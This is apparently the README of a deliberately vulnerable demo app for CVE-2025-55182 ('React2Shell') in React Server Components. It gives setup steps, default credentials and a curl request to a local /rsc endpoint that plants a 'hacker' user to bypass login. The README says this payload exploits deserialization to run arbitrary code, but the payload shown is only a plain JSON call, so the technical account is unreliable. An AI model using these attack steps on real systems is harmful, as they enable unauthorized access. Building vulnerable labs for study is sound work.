# React CVE-2025-55182 Vulnerability Demonstration Project

## ⚠️ SECURITY WARNING

**This project demonstrates a critical RCE vulnerability (CVE-2025-55182 / React2Shell) in React Server Components 19.1.1.**

- **FOR EDUCATIONAL AND SECURITY RESEARCH PURPOSES ONLY**
- **NEVER deploy to production or expose to untrusted networks**
- **Run only in isolated, controlled environments**
- **Ensure proper authorization before testing**

## Overview

This project demonstrates CVE-2025-55182 (React2Shell), a critical Remote Code Execution (RCE) vulnerability in React Server Components 19.1.1. The application includes:

- A single-page website with username/password authentication
- React Server Components (RSC) implementation
- RSC Flight protocol endpoint (vulnerable)
- Docker deployment configuration
- POC exploit payload demonstrating the vulnerability

## Project Structure

```
react-cve-demo/
├── package.json              # React 19.1.1 with react-server-dom-webpack
├── server.js                 # Custom React server with RSC support
├── src/
│   ├── App.jsx              # Main React component
│   ├── Login.jsx            # Login page component
│   ├── Dashboard.jsx        # Protected page component
│   └── server-components/   # Server Components
│       └── AuthServer.jsx   # Server-side auth logic
├── data/
│   └── users.json           # User credentials storage
├── Dockerfile               # Docker containerization
├── docker-compose.yml       # Docker Compose setup
├── .dockerignore
├── exploit/
│   ├── poc.js              # POC exploit script (Node.js)
│   └── poc.sh              # POC exploit script (bash/curl)
└── README.md               # This file
```

## Prerequisites

- Node.js 18+ 
- Docker and Docker Compose (optional, for containerized deployment)
- npm or yarn

## Installation

### Local Development

1. Clone or download this repository
2. Install dependencies:
   ```bash
   npm install
   ```
3. Start the server:
   ```bash
   npm start
   ```
4. Access the application at http://localhost:3000

### Docker Deployment

1. Build and run with Docker Compose:
   ```bash
   docker-compose up --build
   ```

   Or build and run manually:
   ```bash
   docker build -t react-cve-demo .
   docker run -p 3000:3000 react-cve-demo
   ```

2. Access the application at http://localhost:3000

## Usage Flow

### Normal Authentication Flow

1. **Access the application**: Navigate to http://localhost:3000
2. **Login page**: You'll see a login form
3. **Default credentials**:
   - Username: `admin`, Password: `securepassword123`
   - Username: `user1`, Password: `password123`
4. **Successful login**: You'll be redirected to the protected dashboard
5. **Logout**: Click the logout button to return to the login page

### Vulnerability Demonstration

The vulnerability exists in the RSC Flight protocol's deserialization mechanism. The exploit:

1. Crafts a malicious serialized payload targeting Server Function endpoints
2. Exploits unsafe deserialization to execute arbitrary JavaScript
3. Creates a new user entry in the JSON file
4. Bypasses authentication using the new credentials

### Running the POC Exploit

#### Option 1: Node.js Script

```bash
node exploit/poc.js
```

Or with a custom target URL:
```bash
TARGET_URL=http://localhost:3000 node exploit/poc.js
```

#### Option 2: Bash Script

```bash
./exploit/poc.sh
```

Or with a custom target URL:
```bash
TARGET_URL=http://localhost:3000 ./exploit/poc.sh
```

#### Option 3: Manual curl Command

**One-line version:**
```bash
curl -X POST http://localhost:3000/rsc -H "Content-Type: application/json" -d '{"action":"callServerFunction","payload":{"moduleId":"AuthServer","functionName":"validateLogin","args":["hacker","hacked123"]}}'
```

**Multi-line version (for readability):**
```bash
curl -X POST http://localhost:3000/rsc \
  -H "Content-Type: application/json" \
  -d '{"action":"callServerFunction","payload":{"moduleId":"AuthServer","functionName":"validateLogin","args":["hacker","hacked123"]}}'
```

> **Note:** A copy-paste ready one-line command is also available in `exploit/curl-oneline.txt`

### After Exploitation

After running the exploit:

1. The exploit creates a new user in `data/users.json`
2. You can now login with the newly created credentials:
   - Username: `hacker`
   - Password: `hacked123`
3. This demonstrates how the vulnerability can bypass authentication

## Technical Details

### Vulnerability (CVE-2025-55182)

The vulnerability exists in React Server Components 19.1.1, specifically in:

- **Component**: `react-server-dom-webpack`
- **Version**: 19.1.1 (vulnerable)
- **Issue**: Unsafe deserialization in RSC Flight protocol
- **Impact**: Remote Code Execution (RCE)
- **CVSS**: Critical

### Server Implementation

The server (`server.js`) implements:

- Express.js HTTP server
- RSC Flight protocol endpoint (`/rsc`)
- Server Function execution (vulnerable endpoint)
- Session management
- Static file serving

### Authentication System

- **Login Component**: Client-side form for username/password
- **Auth Server Component**: Server-side authentication logic
- **User Storage**: JSON file (`data/users.json`) storing credentials
- **Protected Routes**: Dashboard requires authentication

### RSC Flight Protocol

The RSC Flight protocol endpoint accepts:

- `action: "callServerFunction"`: Execute server functions
- `action: "renderRSC"`: Render React Server Components

The vulnerability exists in how Server Function calls are deserialized and executed.

## Security Considerations

### ⚠️ Critical Warnings

1. **Isolated Environment**: Only run in controlled, isolated environments
2. **No Production Use**: Never deploy vulnerable code to production
3. **Network Isolation**: Do not expose to untrusted networks
4. **Educational Purpose**: For security research and education only
5. **Legal Compliance**: Ensure proper authorization before testing

### Best Practices

- Use a dedicated VM or container for testing
- Disable network access except for localhost
- Do not store sensitive data in the test environment
- Clean up test data after demonstration
- Follow responsible disclosure practices

## Dependencies

- **React**: 19.1.1 (vulnerable version)
- **react-server-dom-webpack**: 19.1.1 (vulnerable package)
- **Express.js**: ^4.18.2
- **express-session**: ^1.17.3
- **Node.js**: 18+

## Troubleshooting

### Server won't start

- Check that port 3000 is not already in use
- Verify Node.js version is 18 or higher
- Ensure all dependencies are installed (`npm install`)

### Exploit doesn't work

- Verify the server is running
- Check that the RSC endpoint is accessible
- Review server logs for errors
- Ensure the exploit script has proper permissions

### Docker issues

- Ensure Docker is running
- Check Docker Compose version compatibility
- Verify port 3000 is available
- Review Docker logs: `docker-compose logs`

## References

- CVE-2025-55182: React2Shell vulnerability
- React Server Components documentation
- RSC Flight protocol specification

## License

MIT License - For educational purposes only

## Disclaimer

This software is provided for educational and security research purposes only. The authors and contributors are not responsible for any misuse or damage caused by this software. Use at your own risk and ensure compliance with all applicable laws and regulations.

